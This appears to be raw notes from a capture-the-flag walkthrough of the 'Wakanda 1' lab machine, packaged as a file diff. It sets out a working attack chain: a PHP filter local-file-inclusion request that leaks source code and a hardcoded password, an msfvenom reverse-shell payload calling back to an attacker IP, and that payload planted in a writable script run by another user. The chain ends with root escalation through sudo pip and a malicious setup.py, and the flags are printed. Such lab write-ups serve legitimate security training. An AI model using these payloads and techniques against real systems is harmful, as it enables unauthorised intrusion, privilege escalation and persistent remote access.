@@ -1,0 +1,179 @@
+GET /?lang=php://filter/convert.base64-encode/resource=index HTTP/1.1
+
+
+
+
+
+PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
+
+
+
+
+base64 -->
+{
+include($_GET['lang'].".php");
+}
+
+?>
+
+
+
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Vibranium market">
+    <meta name="author" content="mamadou">
+
+    <title>Vibranium Market</title>
+
+
+    <link href="bootstrap.css" rel="stylesheet">
+
+    
+    <link href="cover.css" rel="stylesheet">
+  </head>
+
+  <body class="text-center">
+
+    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
+      <header class="masthead mb-auto">
+        <div class="inner">
+          <h3 class="masthead-brand">Vibranium Market</h3>
+          <nav class="nav nav-masthead justify-content-center">
+            <a class="nav-link active" href="#">Home</a>
+            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
+          </nav>
+        </div>
+      </header>
+
+      <main role="main" class="inner cover">
+        <h1 class="cover-heading">Coming soon</h1>
+        <p class="lead">
+          <?php
+            if (isset($_GET['lang']))
+          {
+          echo $message;
+          }
+          else
+          {
+            ?>
+
+            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
+            <?php
+          }
+?>
+        </p>
+        <p class="lead">
+          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
+        </p>
+      </main>
+
+      <footer class="mastfoot mt-auto">
+        <div class="inner">
+          <p>Made by<a href="#">@mamadou</a></p>
+        </div>
+      </footer>
+    </div>
+
+
+
+  
+
+</body></html>
+
+
+
+users:
+mamadou:Niamey4Ever227!!!
+
+>>> 
+>>> 
+>>> 
+>>> import pty;
+>>> pty.spawn('/bin/bash')
+mamadou@Wakanda1:~$ 
+mamadou@Wakanda1:~$ 
+mamadou@Wakanda1:~$ id
+uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
+
+
+mamadou@Wakanda1:~$ cat flag1.txt
+
+Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
+
+
+
+hack@kali:~/CTF/Wakanda:1$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.14 LPORT=1235 -f raw 
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 621 bytes
+python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICwgICAgICAgIHN1YnByb2Nlc3MgICAgICAsICAgICAgICBvcyAgICAgICA7ICAgICAgIGhvc3Q9IjE5Mi4xNjguMS4xNCIgICAgICAgOyAgICAgICBwb3J0PTEyMzUgICAgICAgOyAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAsICAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgLCAgICAgICAgcG9ydCkpICAgICAgIDsgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgICAgICAgMCkgICAgICAgOyAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgICAgICAxKSAgICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAgICAgIDIpICAgICAgIDsgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"
+
+Copied into .antivirus.py with echo
+
+mamadou@Wakanda1:~$ cat /srv/.ant*
+open('/tmp/test','w').write('test')
+exec('aW1wb3J0IHNvY2tldCAgICAgICwgICAgICAgIHN1YnByb2Nlc3MgICAgICAsICAgICAgICBvcyAgICAgICA7ICAgICAgIGhvc3Q9IjE5Mi4xNjguMS4xNCIgICAgICAgOyAgICAgICBwb3J0PTEyMzUgICAgICAgOyAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAsICAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgLCAgICAgICAgcG9ydCkpICAgICAgIDsgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgICAgICAgMCkgICAgICAgOyAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgICAgICAxKSAgICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAgICAgIDIpICAgICAgIDsgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))
+mamadou@Wakanda1:~$ 
+
+devops@Wakanda1:~$ cat flag2.txt
+cat flag2.txt
+Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
+
+
+
+devops@Wakanda1:/$ sudo -l
+sudo -l
+Matching Defaults entries for devops on Wakanda1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User devops may run the following commands on Wakanda1:
+    (ALL) NOPASSWD: /usr/bin/pip
+devops@Wakanda1:/$ TF=$(mktemp -d)
+TF=$(mktemp -d)
+devops@Wakanda1:/$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+<', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py               
+devops@Wakanda1:/$ sudo pip install $TF
+sudo pip install $TF
+Unpacking /tmp/tmp.JQhqMYxuSA
+  Running setup.py (path:/tmp/pip-rGnhmS-build/setup.py) egg_info for package from file:///tmp/tmp.JQhqMYxuSA
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+pwd
+/tmp/pip-rGnhmS-build
+# cd /root
+cd /root
+# ls
+ls
+root.txt
+# cat root.txt
+cat root.txt
+ _    _.--.____.--._
+( )=.-":;:;:;;':;:;:;"-._
+ \\\:;:;:;:;:;;:;::;:;:;:\
+  \\\:;:;:;:;:;;:;:;:;:;:;\
+   \\\:;::;:;:;:;:;::;:;:;:\
+    \\\:;:;:;:;:;;:;::;:;:;:\
+     \\\:;::;:;:;:;:;::;:;:;:\
+      \\\;;:;:_:--:_:_:--:_;:;\
+       \\\_.-"             "-._\
+        \\
+         \\
+          \\
+           \\ Wakanda 1 - by @xMagass
+            \\
+             \\
+
+
+Congratulations You are Root!
+
+821ae63dbe0c573eff8b69d451fb21bc
+
+# 
+
